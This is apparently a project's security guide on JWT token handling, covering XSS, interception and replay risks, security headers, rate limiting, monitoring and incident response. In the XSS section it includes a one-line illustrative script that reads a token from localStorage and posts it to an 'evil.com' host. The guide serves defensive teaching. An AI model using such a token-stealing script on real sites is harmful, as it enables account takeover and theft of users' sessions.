# 🔐 Security Guide: JWT Token Management

## **Overview**

This document explains the security measures implemented in our JWT token system and addresses common security concerns.

## **🔍 What Users Can See**

### **Browser Developer Tools:**
- ✅ **Network Tab**: All HTTP requests/responses including Authorization headers
- ✅ **Application Tab**: LocalStorage, SessionStorage, Cookies
- ✅ **Console**: JavaScript logs and errors
- ✅ **Sources**: All frontend code

### **What's Visible:**
```javascript
// In Network tab - Authorization header
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

// In Application tab - if stored in localStorage
localStorage.getItem('token') // Returns the full JWT
```

## **🛡️ Security Risks & Mitigations**

### **1. Token Theft Risks**

#### **Risk: XSS (Cross-Site Scripting)**
```javascript
// Malicious script could steal tokens
<script>
  const token = localStorage.getItem('token');
  fetch('https://evil.com/steal', { body: token });
</script>
```

#### **Mitigation:**
- ✅ **Content Security Policy (CSP)** headers
- ✅ **XSS Protection** headers
- ✅ **Input sanitization** on all user inputs
- ✅ **HttpOnly cookies** for sensitive tokens

### **2. Man-in-the-Middle Attacks**

#### **Risk:**
- 🔴 Intercepting tokens over unsecured connections
- 🔴 Token exposure in network traffic

#### **Mitigation:**
- ✅ **HTTPS Only** (Strict-Transport-Security header)
- ✅ **Short-lived tokens** (24h access tokens)
- ✅ **Token revocation** capability

### **3. Token Replay Attacks**

#### **Risk:**
- 🔴 Reusing stolen tokens
- 🔴 Token reuse across different devices

#### **Mitigation:**
- ✅ **Database-backed validation** (check if revoked)
- ✅ **Device tracking** (user agent + IP)
- ✅ **Token expiration** enforcement

## **🛡️ Security Features Implemented**

### **1. Dual Token System**
```javascript
// Access Token: Short-lived (24h)
const accessToken = await TokenService.generateToken(user, 'access');

// Refresh Token: Long-lived (7d) but rarely transmitted
const refreshToken = await TokenService.generateToken(user, 'refresh');
```

### **2. Database-Backed Token Validation**
```javascript
// Every token request is validated against database
const validation = await TokenService.validateToken(token);
if (!validation.valid || validation.tokenRecord.isRevoked) {
  return { valid: false, reason: 'Token invalid or revoked' };
}
```

### **3. Rate Limiting**
```javascript
// Prevent brute force attacks
router.post('/login', rateLimit(15 * 60 * 1000, 10), login);
// 10 login attempts per 15 minutes
```

### **4. Security Headers**
```javascript
// XSS Protection
res.setHeader('X-XSS-Protection', '1; mode=block');

// Prevent MIME sniffing
res.setHeader('X-Content-Type-Options', 'nosniff');

// Prevent clickjacking
res.setHeader('X-Frame-Options', 'DENY');

// HTTPS only
res.setHeader('Strict-Transport-Security', 'max-age=31536000');
```

### **5. Suspicious Activity Detection**
```javascript
// Monitor for unusual token usage
if (validation.tokenRecord.userAgent !== userAgent) {
  console.warn('⚠️ User agent mismatch detected');
}

if (validation.tokenRecord.ipAddress !== ipAddress) {
  console.warn('⚠️ IP address mismatch detected');
}
```

## **🔒 Best Practices for Frontend**

### **1. Token Storage**
```javascript
// ❌ DON'T: Store in localStorage (vulnerable to XSS)
localStorage.setItem('token', token);

// ✅ DO: Use HttpOnly cookies (server-side only)
// Set by server with httpOnly: true, secure: true

// ✅ DO: Use memory storage (cleared on page refresh)
let tokenInMemory = null;
```

### **2. Token Transmission**
```javascript
// ✅ DO: Always use HTTPS
// ✅ DO: Include in Authorization header
fetch('/api/users/profile', {
  headers: { 'Authorization': `Bearer ${token}` }
});
```

### **3. Token Refresh**
```javascript
// ✅ DO: Automatic token refresh
// ✅ DO: Handle expired tokens gracefully
// ✅ DO: Clear tokens on logout
```

## **🚨 Security Monitoring**

### **1. Token Usage Logging**
```javascript
// Log all token validations
console.log(`🔐 Token validated for user ${userId}`);
console.log(`⚠️ Suspicious activity: ${reason}`);
```

### **2. Session Management**
```javascript
// Track active sessions
GET /api/users/active-sessions

// Force logout from all devices
POST /api/users/logout-all-devices
```

### **3. Automatic Cleanup**
```javascript
// Clean expired tokens every hour
setInterval(cleanupExpiredTokens, 60 * 60 * 1000);
```

## **📊 Security Metrics**

### **What We Track:**
- ✅ **Active sessions** per user
- ✅ **Token usage patterns**
- ✅ **Suspicious activity** (IP/user agent changes)
- ✅ **Failed authentication** attempts
- ✅ **Token revocation** events

### **Security Alerts:**
- 🚨 **Multiple failed logins** from same IP
- 🚨 **Token usage from new device** without re-auth
- 🚨 **Unusual token refresh** patterns
- 🚨 **Token usage from different countries**

## **🔧 Security Configuration**

### **Environment Variables:**
```env
# JWT Configuration
JWT_SECRET=your-super-secret-key-change-in-production
ACCESS_TOKEN_EXPIRY=24h
REFRESH_TOKEN_EXPIRY=7d

# Security Headers
CSP_POLICY=default-src 'self'
HSTS_MAX_AGE=31536000

# Rate Limiting
LOGIN_RATE_LIMIT=10
REGISTER_RATE_LIMIT=5
```

### **Production Security Checklist:**
- ✅ **HTTPS only** in production
- ✅ **Strong JWT secret** (32+ characters)
- ✅ **Rate limiting** enabled
- ✅ **Security headers** configured
- ✅ **Token cleanup** scheduled
- ✅ **Monitoring** and alerting setup
- ✅ **Regular security audits**

## **🆘 Incident Response**

### **If Token is Compromised:**
1. **Immediate Actions:**
   ```javascript
   // Revoke the specific token
   await TokenService.revokeToken(compromisedToken);
   
   // Or revoke all user tokens
   await TokenService.revokeAllUserTokens(userId);
   ```

2. **Investigation:**
   - Check token usage logs
   - Identify source of compromise
   - Review security measures

3. **Prevention:**
   - Update security measures
   - Educate users on security
   - Implement additional monitoring

## **📚 Additional Resources**

- [OWASP JWT Security](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JWT_Token)
- [JWT Security Best Practices](https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/)
- [Token Storage Security](https://web.dev/storage-for-the-web/)

---

**Remember**: Security is an ongoing process. Regularly review and update security measures based on new threats and best practices. 